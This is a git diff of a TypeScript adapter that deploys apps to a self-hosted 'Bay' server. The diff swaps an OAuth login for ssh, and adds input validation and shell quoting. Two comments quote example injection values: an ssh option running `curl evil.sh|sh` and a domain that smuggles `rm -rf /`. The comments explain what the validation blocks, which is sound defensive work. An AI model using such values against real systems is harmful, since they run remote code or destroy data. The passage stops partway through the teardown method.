@@ -2,11 +2,8 @@ import { join } from "node:path";
 import { $inject, $store, AlephaError } from "alepha";
 import { buildOptions, PackageManagerUtils } from "alepha/cli";
 import type { RunnerMethod } from "alepha/command";
-import { DateTimeProvider } from "alepha/datetime";
 import { $logger } from "alepha/logger";
 import { FileSystemProvider, ShellProvider } from "alepha/system";
-import type { BayCredential } from "../providers/BayCredentialProvider.ts";
-import { BayCredentialProvider } from "../providers/BayCredentialProvider.ts";
 import {
   PlatformAdapter,
   type PlatformContext,
@@ -14,337 +11,412 @@ import {
 } from "./PlatformAdapter.ts";
 
 /**
- * How the CLI identifies itself to the authorization server.
- */
-const CLIENT_ID = "alepha-cli";
-
-/**
- * How long before expiry a token is renewed.
- *
- * A minute, because the token is checked once and then used for a whole
- * deploy: one that is valid at the check and dead by the upload fails halfway
- * through, which is far worse than renewing slightly too often.
- */
-const TOKEN_REFRESH_SKEW_MS = 60_000;
-
-/**
- * The subset of an OAuth token response this adapter stores.
- */
-interface TokenResponse {
-  access_token: string;
-  refresh_token?: string;
-  expires_in?: number;
-  error?: string;
-}
-
-/**
  * Deploys to Alepha Bay — a self-hosted application server on a machine you own.
  *
- * The whole adapter is thin, and that is the point: Bay consumes the artifact
- * the framework already produces. There is no Bay-specific build target and no
- * Bay-specific manifest — `alepha build` emits `dist/manifest.json` describing
- * what the app declares, `alepha pack` wraps it with `migrations/`, and this
- * uploads the result. A second description of the same app is exactly the
- * code↔infra drift the derived manifest exists to prevent.
+ * **There is no credential here, and that is the design.** This drives the
+ * `bay` CLI on the host through the machine's own `ssh` binary, and `bay` is
+ * itself a thin client of a unix socket whose permissions the kernel enforces.
+ * So authorization is two facts that already exist on the host: the SSH key
+ * gets you a shell as some user, and that user's membership in the control
+ * group gets you the socket. Nothing is stored under `~/.config`, nothing is
+ * refreshed, and nothing can leak into a CI log.
  *
- * **Resources are not provisioned from here.** `provision` stays empty because
- * Bay reads the manifest and creates the database, the storage directory and
- * the sandbox's writable paths itself. Declaring `$repository` is what
- * provisions the database; nothing in this file needs to know that.
+ * This replaced an OAuth device-grant flow against a Bay admin panel — an HTTP
+ * API that was never written. What it deploys is unchanged: `alepha build`
+ * emits `dist/manifest.json`, `alepha pack` wraps it with `migrations/`, and
+ * Bay reads the manifest to decide what to provision. A second description of
+ * the same app is exactly the code↔infra drift the derived manifest prevents,
+ * which is why `provision` stays empty.
  */
 export class BayAdapter extends PlatformAdapter {
   protected readonly log = $logger();
   protected readonly fs = $inject(FileSystemProvider);
   protected readonly shell = $inject(ShellProvider);
-  protected readonly credentials = $inject(BayCredentialProvider);
   protected readonly pm = $inject(PackageManagerUtils);
-  protected readonly dateTime = $inject(DateTimeProvider);
   // The workspace's resolved build configuration, read for one question only:
   // whether this app is a static site. See `build`.
   protected readonly buildOptions = $store(buildOptions);
 
   /**
-   * The Bay whose control panel this deploys through.
+   * The unix group Bay publishes its control socket to.
+   *
+   * `defaultControlGroup` on the Go side. A host started with
+   * `--control-group` uses another name, so every message that mentions this
+   * says which group was looked for rather than asserting there is only one.
+   */
+  protected readonly controlGroup = "bay-control";
+
+  /**
+   * What an app name and an environment name are allowed to look like.
+   *
+   * Matches the keys Bay itself accepts. Anything else is refused before it
+   * reaches a command line — see {@link assertSafe}.
+   */
+  protected readonly appKeyPattern = /^[a-z0-9][a-z0-9._-]*$/;
+
+  /**
+   * A plain hostname. Deliberately excludes `*`: Bay answers ACME over HTTP-01
+   * and TLS-ALPN, neither of which can prove a wildcard, so passing one through
+   * would fail on the host with a certificate error naming nothing about this
+   * configuration.
+   */
+  protected readonly hostnamePattern =
+    /^[A-Za-z0-9]([A-Za-z0-9-]*[A-Za-z0-9])?(\.[A-Za-z0-9]([A-Za-z0-9-]*[A-Za-z0-9])?)*$/;
+
+  /**
+   * An ssh destination: `host`, `user@host`, or an alias from `~/.ssh/config`.
+   *
+   * The leading character is the load-bearing part. A value starting with `-`
+   * is consumed by ssh as an OPTION rather than a destination, so a "host" of
+   * `-oProxyCommand=curl evil.sh|sh` would execute before any remote shell
+   * exists. OpenSSH has no reliable `--` terminator, so this pattern is the
+   * defence.
+   */
+  protected readonly destinationPattern =
+    /^[A-Za-z0-9_][A-Za-z0-9._-]*(@[A-Za-z0-9][A-Za-z0-9.-]*)?$/;
+
+  /**
+   * An absolute filesystem path for `--control-socket`, excluding shell
+   * metacharacters.
+   *
+   * Anchored at both ends like the other patterns here: the value is quoted
+   * before it reaches `ssh` (see {@link quote}) too, but validating it up
+   * front is what still catches a future caller that forgets to.
+   */
+  protected readonly socketPathPattern = /^\/[\w./-]+$/;
+
+  /**
+   * The Bay this environment deploys to.
    *
    * A Bay is a machine someone owns, so unlike Cloudflare there is no global
-   * endpoint to assume — it has to be configured. `$BAY_ENDPOINT` wins so a fork
-   * or a second Bay needs no edit to `alepha.config.ts`.
+   * destination to assume — it has to be configured. Passed to `ssh` verbatim,
+   * so it may be an alias from `~/.ssh/config`, which is where a port, an
+   * identity file or a jump host belong. `$BAY_HOST` wins so CI needs no edit
+   * to a committed config.
    */
-  protected endpoint(ctx: PlatformContext): string {
-    const configured = process.env.BAY_ENDPOINT ?? ctx.envConfig.endpoint;
+  protected host(ctx: PlatformContext): string {
+    const configured = process.env.BAY_HOST ?? ctx.envConfig.host;
     if (!configured) {
       throw new AlephaError(
-        `No Bay endpoint for environment "${ctx.env}". Set it in alepha.config.ts — ` +
-          `platform({ environments: { ${ctx.env}: { adapter: "bay", endpoint: "https://admin.example.com" } } }) — ` +
-          "or export BAY_ENDPOINT.",
+        `No Bay host for environment "${ctx.env}". Set it in alepha.config.ts — ` +
+          `platform({ environments: { ${ctx.env}: { adapter: "bay", host: "deploy@bay.example.com" } } }) — ` +
+          "or export BAY_HOST.",
       );
     }
-    return configured.replace(/\/$/, "");
+    this.assertSafe("host", configured, this.destinationPattern);
+    return configured;
   }
 
   /**
-   * Reads the credential, without ever printing it.
+   * The absolute path to Bay's control socket on the host, when this
+   * environment needs to say so explicitly.
    *
-   * `$BAY_API_KEY` first, so CI supplies one with no file and no login. A laptop
-   * gets one from `alepha platform auth login`, which is the same currency —
-   * one kind of credential in the whole system, revocable in one place.
+   * Bay's default root is the *relative* path `./bay-data`, and an ssh
+   * command runs non-interactively with cwd `$HOME` — so on any host whose
+   * Bay root is not `$HOME/bay-data` (every `--root /var/lib/bay` install,
+   * for one), Bay's own guess at the socket path misses and every command
+   * this adapter sends fails to find it. `$BAY_SOCKET` on the Bay host is
+   * Bay's own escape hatch for this, but it cannot be relied on here: a
+   * non-interactive ssh command reads neither `~/.profile` nor, on
+   * Debian/Ubuntu's default, `~/.bashrc`, so there is nowhere reliable to
+   * export it from. Passing `--control-socket` on every command (see
+   * {@link bayArgv}) sidesteps needing a remote shell profile at all.
+   *
+   * `$BAY_SOCKET` in this process's own environment overrides the config,
+   * the same way `$BAY_HOST` overrides {@link host}. Undefined is the normal
+   * case: with nothing configured, Bay's own default-root guess is left to
+   * work or fail on its own.
    */
-  protected async apiKey(ctx: PlatformContext): Promise<string> {
-    const endpoint = this.endpoint(ctx);
-    const credential = await this.credentials.get(endpoint);
-    if (!credential) {
+  protected socket(ctx: PlatformContext): string | undefined {
+    const configured = process.env.BAY_SOCKET ?? ctx.envConfig.socket;
+    if (!configured) {
+      return undefined;
+    }
+    this.assertSafe("control socket path", configured, this.socketPathPattern);
+    return configured;
+  }
+
+  /**
+   * Refuses a value that has no business on a command line.
+   *
+   * `ssh` joins its command arguments into ONE string and hands it to the
+   * remote login shell, so the local argv-array form protects nothing on the
+   * far side: a domain of `a.com; rm -rf /` would run as two commands. Values
+   * are quoted as well (see {@link quote}) — this is the half that still works
+   * the day someone adds a field and forgets to quote it.
+   *
+   * The message names the value and the rule, because "invalid input" sends
+   * the reader to the wrong file.
+   */
+  protected assertSafe(label: string, value: string, pattern: RegExp): void {
+    if (!pattern.test(value)) {
       throw new AlephaError(
-        `Not logged in to ${endpoint}. Run \`alepha platform auth login --env ${ctx.env}\`, ` +
-          "or export BAY_API_KEY for a non-interactive caller.",
+        `Refusing to put ${label} "${value}" on an ssh command line: it does not match ${pattern}. ` +
+          "ssh hands its arguments to the remote login shell as a single string, so a value " +
+          "carrying shell metacharacters would run as a command.",
       );
     }
-    return await this.usableToken(endpoint, ctx.env, credential);
   }
 
   /**
-   * Returns an access token that will still be accepted when it is used.
+   * Makes one argument literal for the remote shell.
    *
-   * Access tokens last fifteen minutes and refresh tokens thirty days, so
-   * without this a login is unusable a quarter of an hour later — and the
-   * failure arrives as a bare 401 from whatever call happened to be next.
-   *
-   * Renewed slightly early: a token that passes the check and expires during
-   * the upload fails halfway through a deploy, which is the worst moment to
-   * discover it.
+   * The same rule `NodeShellProvider.buildShellCommand` uses: a plainly safe
+   * token is left alone so logs and test assertions stay readable, and
+   * everything else is single-quoted — nothing expands inside single quotes,
+   * so `;`, backticks, `$(…)` and `|` cannot break out.
    */
-  protected async usableToken(
-    endpoint: string,
-    env: string,
-    credential: BayCredential,
+  protected quote(value: string): string {
+    if (/^[\w./:=@%,+-]+$/.test(value)) {
+      return value;
+    }
+    return `'${value.replaceAll("'", `'\\''`)}'`;
+  }
+
+  /**
+   * Runs one command on the Bay and returns what it printed.
+   *
+   * `BatchMode=yes` is not optional: without it a deploy in CI sits at a
+   * passphrase prompt forever, and a hung prompt is indistinguishable from a
+   * hung deploy. Everything else about the connection — port, identity, jump
+   * host, multiplexing — is `~/.ssh/config`'s business, which is the whole
+   * reason this shells out to `ssh` instead of speaking the protocol.
+   */
+  protected async remote(
+    ctx: PlatformContext,
+    argv: string[],
+    options: { stdin?: Uint8Array } = {},
   ): Promise<string> {
-    const expiresSoon =
-      credential.expiresAt !== undefined &&
-      credential.expiresAt - this.dateTime.nowMillis() < TOKEN_REFRESH_SKEW_MS;
-    if (!expiresSoon) {
-      return credential.accessToken;
-    }
-    if (!credential.refreshToken) {
-      // Nothing to renew from — an API key, or a credential stored before
-      // refresh tokens were kept. Say so instead of sending a dead token.
-      throw new AlephaError(
-        `Your login to ${endpoint} has expired. ` +
-          `Run \`alepha platform auth login --env ${env}\`.`,
-      );
-    }
-
-    const res = await this.post(`${endpoint}/oauth/token`, {
-      grant_type: "refresh_token",
-      refresh_token: credential.refreshToken,
-      client_id: CLIENT_ID,
-    });
-    if (!res.ok) {
-      // A refresh token is good for thirty days; past that, or once revoked,
-      // there is exactly one thing to do and no point guessing why.
-      throw new AlephaError(
-        `Your login to ${endpoint} has expired and could not be renewed ` +
-          `(${res.status}). Run \`alepha platform auth login --env ${env}\`.`,
-      );
-    }
-    const renewed = this.toCredential(
-      res.body as TokenResponse,
-      credential.refreshToken,
+    return await this.shell.run(
+      [
+        "ssh",
+        "-o",
+        "BatchMode=yes",
+        this.host(ctx),
+        argv.map((arg) => this.quote(arg)).join(" "),
+      ],
+      { capture: true, stdin: options.stdin },
     );
-    await this.credentials.set(endpoint, renewed);
-    this.log.debug(`Renewed the credential for ${endpoint}`);
-    return renewed.accessToken;
   }
 
   /**
-   * Shapes a token endpoint response for storage.
+   * Builds the argv for one `bay` subcommand, appending `--control-socket
+   * <path>` when one is configured for this environment.
    *
-   * `previousRefresh` is kept when the server does not rotate: dropping it
-   * would silently turn a thirty-day login into a fifteen-minute one.
+   * Every `bay` subcommand accepts the flag, so every caller that runs one
+   * goes through this. `id -nG`, used by {@link login} to check group
+   * membership before ever asking `bay` anything, is NOT a Bay command and
+   * must never be built with this — the flag would be meaningless to it.
    */
-  protected toCredential(
-    body: TokenResponse,
-    previousRefresh?: string,
-  ): BayCredential {
-    return {
-      accessToken: body.access_token,
-      refreshToken: body.refresh_token ?? previousRefresh,
-      expiresAt: body.expires_in
-        ? this.dateTime.nowMillis() + body.expires_in * 1000
-        : undefined,
-    };
+  protected bayArgv(ctx: PlatformContext, args: string[]): string[] {
+    const socket = this.socket(ctx);
+    return socket
+      ? ["bay", ...args, "--control-socket", socket]
+      : ["bay", ...args];
   }
 
   /**
-   * Waits between polls.
+   * The hostnames this environment asks Bay to serve, canonical first.
    *
-   * A seam for the same reason as `post`: the back-off is the part worth
-   * testing, and a test that honoured it would take half a minute to prove one
-   * addition.
+   * Repeatable AND comma-separated on Bay's side, because both shapes turn up:
+   * a hand-typed apex plus `www`, and a value pasted out of a config file. One
+   * `--domain` per host is the form that cannot be misparsed.
+   *
+   * Empty is the normal case: with no domain Bay composes
+   * `<name>[-<env>].<baseDomain>` itself, so a workspace that configures
+   * nothing still lands somewhere predictable.
    */
-  protected async sleep(ms: number): Promise<void> {
-    await new Promise((resolve) => setTimeout(resolve, ms));
+  protected domains(ctx: PlatformContext): string[] {
+    const configured = ctx.envConfig.domain;
+    if (!configured) {
+      return [];
+    }
+    return configured
+      .split(",")
+      .map((host) => host.trim())
+      .filter(Boolean)
+      .map((host) => {
+        this.assertSafe("domain", host, this.hostnamePattern);
+        return host;
+      });
   }
 
   /**
-   * One place where this adapter speaks JSON to the authorization server.
+   * Turns whatever `ssh` failed with into a sentence naming the fix.
    *
-   * A seam, not an abstraction: every OAuth call here is the same shape, and
-   * routing them through one method is what lets a test substitute the network
-   * without `vi.mock` — which this codebase does not use.
-   */
-  protected async post(
-    url: string,
-    body: Record<string, unknown>,
-  ): Promise<{ ok: boolean; status: number; body: unknown }> {
-    const res = await fetch(url, {
-      method: "POST",
-      headers: { "content-type": "application/json" },
-      body: JSON.stringify(body),
-    });
-    return { ok: res.ok, status: res.status, body: await res.json() };
-  }
-
-  /**
-   * Obtains a credential through the device grant (RFC 8628).
+   * Each branch fails at a different layer and wants a different fix, and
+   * several share vocabulary that would misfire if the branches were
+   * reordered — each one's comment says which lower branch it would
+   * otherwise fall into, and each is a bad diagnosis for that other cause:
    *
-   * The flow exists because a terminal cannot receive a browser redirect: it
-   * prints a short code, the human approves it in a session that already
-   * exists, and the CLI polls until it does. Nothing secret is ever typed into
-   * the terminal, and nothing lands in shell history.
+   * - "no control socket found" means Bay never even tried to dial anything
+   *   — nothing was passed via `--control-socket` and its own relative-path
+   *   guess found no file. That is NOT a group problem, so it must not
+   *   produce the `usermod` advice below it.
+   * - A permission-denied dial naming a `.sock` path IS the group problem:
+   *   the socket file was found (its directory is world-readable) but this
+   *   user was refused. The expensive one, because the key works and the
+   *   shell opens before it surfaces.
+   * - `bay` treating `-` as a literal filename means it predates stdin
+   *   support and needs upgrading — not that it is missing from PATH.
+   * - A dial that fails with "no such file or directory" (rather than
+   *   "permission denied") means the configured `socket` path itself is
+   *   wrong — the file it names does not exist — which is a config fix, not
+   *   a PATH problem or a group problem.
    */
-  async login(ctx: PlatformContext, run: RunnerMethod): Promise<void> {
-    const endpoint = this.endpoint(ctx);
+  protected explain(host: string, error: unknown): AlephaError {
+    const detail = String(
+      (error as { stderr?: string })?.stderr ||
+        (error as Error)?.message ||
+        error,
+    ).trim();
 
-    const start = await this.post(`${endpoint}/oauth/device_authorization`, {
-      client_id: CLIENT_ID,
-      scope: "deploy",
-    });
-    if (!start.ok) {
-      throw new AlephaError(
-        `${endpoint} does not offer a device login (${start.status}). ` +
-          "Is it a Bay admin panel, and is its OAuth server enabled?",
+    if (/no control socket found/i.test(detail)) {
+      return new AlephaError(
+        `Signed in to ${host}, but Bay never found its own control socket — nothing was passed via ` +
+          "--control-socket, and its own default guess (a relative path resolved under $HOME) " +
+          `missed. Set \`socket\` for this environment in alepha.config.ts to the socket's actual ` +
+          `path on the host. (${detail})`,
       );
     }
-    const grant = start.body as {
-      device_code: string;
-      user_code: string;
-      verification_uri: string;
-      verification_uri_complete?: string;
-      interval?: number;
-      expires_in?: number;
-    };
+    if (/permission denied/i.test(detail) && /\.sock/i.test(detail)) {
+      // Must stay ahead of the bare "permission denied" branch below, which
+      // this text also matches and would misdiagnose as a refused SSH key.
+      return new AlephaError(
+        `Signed in to ${host}, but Bay's control socket refused that user — it is not in the ` +
+          `"${this.controlGroup}" group. On the host: usermod -aG ${this.controlGroup} <user>, ` +
+          `then open a new session. (${detail})`,
+      );
+    }
+    if (/open -:/i.test(detail)) {
+      // `os.Open("-")` failing is what a `bay` from before "-" meant stdin
+      // looks like. Contains "no such file or directory", so it must stay
+      // ahead of the generic PATH branch below, which would otherwise claim
+      // `bay` isn't installed when it plainly is.
+      return new AlephaError(
+        `Signed in to ${host}, but its \`bay\` is too old to read the deploy artifact from stdin — ` +
+          `it tried to open a file literally named "-". Upgrade \`bay\` on the host. (${detail})`,
+      );
+    }
+    if (
+      /dial unix/i.test(detail) &&
+      /no such file or directory/i.test(detail)
+    ) {
+      // Also contains "no such file or directory", so it too must stay ahead
+      // of the generic PATH branch below.
+      return new AlephaError(
+        `Signed in to ${host}, but nothing is listening at the configured control socket path. ` +
+          `Check the \`socket\` value for this environment in alepha.config.ts. (${detail})`,
+      );
+    }
+    if (/permission denied|publickey/i.test(detail)) {
+      return new AlephaError(
+        `${host} refused the SSH key. Add your public key to ~/.ssh/authorized_keys on the host, ` +
+          `or point \`host\` at a ~/.ssh/config entry that uses the right one. (${detail})`,
+      );
+    }
+    if (
+      /command not found|no such file or directory|\bnot found\b/i.test(detail)
+    ) {
+      // The third alternative is for `dash`, whose login shell says
+      // "bay: not found" rather than "command not found".
+      return new AlephaError(
+        `Signed in to ${host}, but \`bay\` is not on that user's PATH. Install it, or add its ` +
+          `directory to the login shell's PATH — an ssh command runs a non-interactive shell, ` +
+          `which reads a different profile. (${detail})`,
+      );
+    }
+    return new AlephaError(`ssh to ${host} failed: ${detail}`);
+  }
 
-    // Printed, not logged: this is the one moment the user must read something,
-    // and a log prefix in front of it makes it harder to see, not easier.
-    process.stdout.write(
-      `\n  Open       ${grant.verification_uri_complete ?? grant.verification_uri}\n` +
-        `  Your code  ${grant.user_code}\n\n`,
-    );
-
-    // Assigned rather than returned: the runner logs whatever its handler
-    // returns, and this is a bearer token. Returning it would print it in the
-    // terminal and into every CI log that ever runs this command.
-    let credential: BayCredential | undefined;
+  /**
+   * Checks the Bay answers before anything expensive happens.
+   *
+   * Probes with `bay list`, not `bay version`: on the Go side `version` is
+   * `fmt.Println(version)` — a local constant, printed without ever dialing
+   * the control socket. It proves only that ssh works and `bay` is on PATH,
+   * so every wrong `socket` path, every missing group membership, and `bay
+   * serve` being down would all survive it and only surface after a full
+   * build and pack — exactly the two minutes this method's own reason for
+   * existing is to save. `list` is the cheapest command that actually reaches
+   * the socket, and {@link inspect} already parses its answer.
+   *
+   * Runs first in `up` precisely so a bad host costs a second rather than a
+   * two-minute build.
+   */
+  async authenticate(ctx: PlatformContext, run: RunnerMethod): Promise<void> {
+    const host = this.host(ctx);
     await run({
-      name: "waiting for approval",
+      name: `check ${host}`,
       handler: async () => {
-        credential = await this.pollForToken(endpoint, grant.device_code, {
-          intervalMs: (grant.interval ?? 5) * 1000,
-          // One second less than the server's own expiry, so the CLI gives up
-          // just before the code does and can say why rather than reporting
-          // whatever the server returns at the boundary.
-          deadline:
-            this.dateTime.nowMillis() + ((grant.expires_in ?? 600) - 1) * 1000,
-        });
+        try {
+          await this.remote(ctx, this.bayArgv(ctx, ["list"]));
+        } catch (error) {
+          throw this.explain(host, error);
+        }
+        this.log.info(`Reached ${host} — Bay's control socket answered.`);
       },
     });
-
-    await this.credentials.set(endpoint, credential!);
-    this.log.info(`Logged in to ${endpoint}`);
-  }
-
-  async logout(ctx: PlatformContext, _run: RunnerMethod): Promise<void> {
-    const endpoint = this.endpoint(ctx);
-    const had = await this.credentials.clear(endpoint);
-    this.log.info(
-      had
-        ? `Forgot the credential for ${endpoint}. It is still valid — revoke it in the admin UI to be sure.`
-        : `No stored credential for ${endpoint}.`,
-    );
   }
 
   /**
-   * Polls the token endpoint until the human answers.
+   * Reports whether the SSH key and the group membership are both in place.
    *
-   * Every branch here is an error string RFC 8628 defines, and each means
-   * something different to do: keep waiting, back off, stop because the user
-   * said no, stop because the code died. Treating them alike would either spin
-   * forever on a refusal or give up on a slow user.
+   * There is nothing to log into — this adapter stores no credential. The
+   * group is checked FIRST, via `id -nG`: a direct, portable answer that does
+   * not depend on the exact wording a denied dial happens to produce on this
+   * OS, and it skips an ssh round trip to the control socket that would only
+   * fail predictably anyway. Only once that passes does this touch the
+   * socket at all — with `bay list`, the same probe {@link authenticate}
+   * uses — so the closing message is actually earned rather than inferred
+   * from `id -nG` alone.
    */
-  protected async pollForToken(
-    endpoint: string,
-    deviceCode: string,
-    opts: { intervalMs: number; deadline: number },
-  ): Promise<BayCredential> {
-    let wait = opts.intervalMs;
-    while (this.dateTime.nowMillis() < opts.deadline) {
-      await this.sleep(wait);
-
-      const res = await this.post(`${endpoint}/oauth/token`, {
-        grant_type: "urn:ietf:params:oauth:grant-type:device_code",
-        device_code: deviceCode,
-        client_id: CLIENT_ID,
-      });
-      const body = res.body as TokenResponse;
-
-      if (res.ok && body.access_token) {
-        // The refresh token is the whole point of keeping a record: without it
-        // this login stops working fifteen minutes from now.
-        return this.toCredential(body);
-      }
-      switch (body.error) {
-        case "authorization_pending":
-          continue;
-        case "slow_down":
-          // The server is telling us we are too fast; obeying is the whole
-          // point of it saying so.
-          wait += 5000;
-          continue;
-        case "access_denied":
-          throw new AlephaError("Login refused.");
-        case "expired_token":
+  async login(ctx: PlatformContext, run: RunnerMethod): Promise<void> {
+    const host = this.host(ctx);
+    await run({
+      name: `check ${host}`,
+      handler: async () => {
+        let groups: string;
+        try {
+          groups = await this.remote(ctx, ["id", "-nG"]);
+        } catch (error) {
+          throw this.explain(host, error);
+        }
+        if (!groups.trim().split(/\s+/).includes(this.controlGroup)) {
           throw new AlephaError(
-            "The code expired before it was approved. Run the command again.",
+            `Reached ${host}, but that user is not in the "${this.controlGroup}" group, so Bay's ` +
+              `control socket is unreachable. On the host: usermod -aG ${this.controlGroup} <user>, ` +
+              "then open a new session. (A Bay started with --control-group uses a different name.)",
           );
-        default:
-          throw new AlephaError(
-            `Unexpected answer from ${endpoint}: ${body.error ?? res.status}`,
-          );
-      }
-    }
-    throw new AlephaError(
-      "Gave up waiting for approval. Run the command again when you are ready.",
-    );
+        }
+
+        try {
+          await this.remote(ctx, this.bayArgv(ctx, ["list"]));
+        } catch (error) {
+          throw this.explain(host, error);
+        }
+        this.log.info(
+          `Reached ${host}, and that user's membership in "${this.controlGroup}" reaches Bay's ` +
+            "control socket — deploys will be accepted.",
+        );
+      },
+    });
   }
 
-  async authenticate(ctx: PlatformContext, _run: RunnerMethod): Promise<void> {
-    const endpoint = this.endpoint(ctx);
-    const key = await this.apiKey(ctx);
-    // Fail here rather than after a two-minute build. `authenticate` runs first
-    // precisely so a bad credential costs a second, not a full pipeline.
-    const res = await fetch(`${endpoint}/api/bay/status`, {
-      headers: { authorization: `Bearer ${key}` },
-    });
-    if (res.status === 401 || res.status === 403) {
-      throw new AlephaError(
-        `Bay at ${endpoint} rejected the credential. Is the key still valid, and does its user have the admin role?`,
-      );
-    }
-    if (!res.ok) {
-      throw new AlephaError(
-        `Bay at ${endpoint} answered ${res.status} to an authentication check.`,
-      );
-    }
-    this.log.info(`Authenticated against ${endpoint}`);
+  /**
+   * Refuses, honestly.
+   *
+   * Doing nothing quietly would be worse: the user would believe access had
+   * been revoked. SSH keys are not Alepha's to revoke, so this says where they
+   * actually live.
+   */
+  async logout(ctx: PlatformContext, _run: RunnerMethod): Promise<void> {
+    const host = this.host(ctx);
+    throw new AlephaError(
+      `Nothing to log out of — this adapter stores no credential. Access to ${host} is your SSH ` +
+        "key: remove the public key from ~/.ssh/authorized_keys on the host to revoke it, or drop " +
+        `the user from the "${this.controlGroup}" group to stop deploys without closing the account.`,
+    );
   }
 
   /**
@@ -413,12 +485,26 @@ export class BayAdapter extends PlatformAdapter {
     });
   }
 
+  /**
+   * Packs the artifact and pipes it into `bay deploy -` in one ssh invocation.
+   *
+   * Piped rather than staged: `scp` to a temp path would double the artifact on
+   * the host's disk, leave litter behind when a deploy dies mid-way, and cost
+   * three round trips instead of one.
+   */
   async deploy(
     ctx: PlatformContext,
     run: RunnerMethod,
   ): Promise<string | undefined> {
-    const endpoint = this.endpoint(ctx);
-    const key = await this.apiKey(ctx);
+    const host = this.host(ctx);
+    this.assertSafe("app name", ctx.project, this.appKeyPattern);
+    this.assertSafe("environment", ctx.env, this.appKeyPattern);
+    // Validated before `pack` runs: two minutes of work must not precede a
+    // rejection that was knowable from the config alone. `socket`'s result
+    // is discarded here — it exists purely to validate early; `bayArgv`
+    // below re-derives it once there is something to deploy.
+    const domains = this.domains(ctx);
+    this.socket(ctx);
 
     let artifact = "";
     await run({
@@ -434,48 +520,47 @@ export class BayAdapter extends PlatformAdapter {
 
     let url: string | undefined;
     await run({
-      name: `deploy → ${endpoint}`,
+      name: `deploy → ${host}`,
       handler: async () => {
-        const body = await this.fs.readFile(artifact);
-        // Multipart, matching the endpoint the admin UI already posts to. One
-        // endpoint with two callers beats a second one that drifts: a bug fixed
-        // for the browser is then fixed for the CLI by construction.
-        const form = new FormData();
-        form.set(
-          "file",
-          new Blob([new Uint8Array(body)], {
-            type: "application/gzip",
-          }),
-          `${ctx.project}.tar.gz`,
-        );
-        form.set("name", ctx.project);
-        form.set("env", ctx.env);
-        // Optional: with no domain, Bay composes the subdomain from the app
-        // name and its own base domain, so a workspace that configures nothing
-        // still lands somewhere predictable.
-        if (ctx.envConfig.domain) {
-          form.set("domain", ctx.envConfig.domain);
+        const args = ["deploy", "-", "--name", ctx.project, "--env", ctx.env];
+        for (const domain of domains) {
+          args.push("--domain", domain);
         }
-        const res = await fetch(`${endpoint}/api/bay/apps`, {
-          method: "POST",
-          // No content-type: fetch sets it with the multipart boundary, and
-          // overriding it makes the body unparseable.
-          headers: { authorization: `Bearer ${key}` },
-          body: form,
-        });
-        const text = await res.text();
-        if (!res.ok) {
-          // Bay's messages are written for an operator — "rebuild with
-          // --target=bare", "redeploy the app to migrate it". Surfaced as-is:
-          // replacing them throws away the only part that says what to do.
-          throw new AlephaError(
-            `Bay refused the deploy (${res.status}): ${this.reason(text)}`,
-          );
+
+        let answer: string;
+        try {
+          // `new Uint8Array(...)` copies the buffer `readFile` already holds,
+          // so peak memory here is roughly twice the artifact's size. Fine at
+          // the ~10 MB an Alepha bundle plus migrations typically is; this
+          // does not stream, so a much larger artifact would want a
+          // different path.
+          answer = await this.remote(ctx, this.bayArgv(ctx, args), {
+            stdin: new Uint8Array(await this.fs.readFile(artifact)),
+          });
+        } catch (error) {
+          throw this.explain(host, error);
         }
-        url = this.reason(text, "url") ?? undefined;
+        url = this.deployedUrl(answer);
       },
     });
     return url;
+  }
+
+  /**
+   * Pulls the served URL out of what `bay deploy` printed.
+   *
+   * Returns nothing when the answer is not JSON, rather than turning the text
+   * into a link. Anything but JSON means something other than `bay deploy`
+   * answered — a login banner, a shell error — and reporting one of those as
+   * an address is how `up` finishes green pointing at nothing.
+   */
+  protected deployedUrl(answer: string): string | undefined {
+    try {
+      const parsed = JSON.parse(answer);
+      return typeof parsed?.url === "string" ? parsed.url : undefined;
+    } catch {
+      return undefined;
+    }
   }
 
   /**
@@ -487,21 +572,42 @@ export class BayAdapter extends PlatformAdapter {
    */
   async migrate(): Promise<void> {}
 
-  async inspect(ctx: PlatformContext): Promise<PlatformState> {
-    const endpoint = this.endpoint(ctx);
-    const key = await this.apiKey(ctx);
-    const res = await fetch(`${endpoint}/api/bay/apps`, {
-      headers: { authorization: `Bearer ${key}` },
-    });
-    if (!res.ok) {
-      throw new AlephaError(`Bay at ${endpoint} answered ${res.status}.`);
+  async inspect(
+    ctx: PlatformContext,
+    _run: RunnerMethod,
+  ): Promise<PlatformState> {
+    const host = this.host(ctx);
+    let answer: string;
+    try {
+      answer = await this.remote(ctx, this.bayArgv(ctx, ["list"]));
+    } catch (error) {
+      throw this.explain(host, error);
     }
-    const apps = (await res.json()) as Array<{
-      name: string;
-      env: string;
-      domain: string;
-      release: string;
-    }>;
+
+    let parsed: unknown;
+    try {
+      parsed = JSON.parse(answer.trim() || "[]");
+    } catch {
+      // Anything but JSON means something other than `bay list` answered —
+      // the same reasoning `deployedUrl` uses for `bay deploy`. Without this,
+      // `platform status` against a login banner or a shell error dies on a
+      // parse error naming neither Bay nor the host.
+      throw new AlephaError(
+        `Bay at ${host} answered \`bay list\` with something other than JSON: ${answer.slice(0, 300)}`,
+      );
+    }
+    // `bay list` marshals a nil slice as `null`, not `[]`, on a Bay with
+    // nothing deployed. Calling .filter on that throws with a message naming
+    // neither Bay nor the empty host.
+    const apps =
+      (parsed as Array<{
+        name: string;
+        env: string;
+        domains?: string[];
+        domain?: string;
+        release: string;
+      }> | null) ?? [];
+
     const mine = apps.filter(
       (a) => a.name === ctx.project && a.env === ctx.env,
     );
@@ -509,7 +615,11 @@ export class BayAdapter extends PlatformAdapter {
       workers: mine.map((a) => ({
         name: `${a.name}/${a.env}`,
         exists: true,
-        detail: a.domain,
+        // `domains` is the live field, canonical first. `domain` is
+        // `LegacyDomain` on the Go side — folded into `domains` and cleared on
+        // load, so it is absent from anything a current Bay writes. Reading
+        // only it reported `undefined` for every app.
+        detail: a.domains?.[0] ?? a.domain,
         version: a.release,
       })),
       // Bay provisions these itself, from the manifest, and exposes no
@@ -530,44 +640,45 @@ export class BayAdapter extends PlatformAdapter {
    * Cloudflare the data lives in D1 and R2, which outlive the worker; on Bay the
    * database and the uploads sit in the app's own directory, so a naive teardown
    * would delete them with no way back. "Stop serving this" is the usual intent,
-   * and destroying data has to be asked for.
+   * and destroying data has to be asked for — `bay remove --purge`, on the host.
    */
   async teardown(ctx: PlatformContext, run: RunnerMethod): Promise<void> {
-    const endpoint = this.endpoint(ctx);
-    const key = await this.apiKey(ctx);
+    const host = this.host(ctx);
+    this.assertSafe("app name", ctx.project, this.appKeyPattern);
+    this.assertSafe("environment", ctx.env, this.appKeyPattern);
+
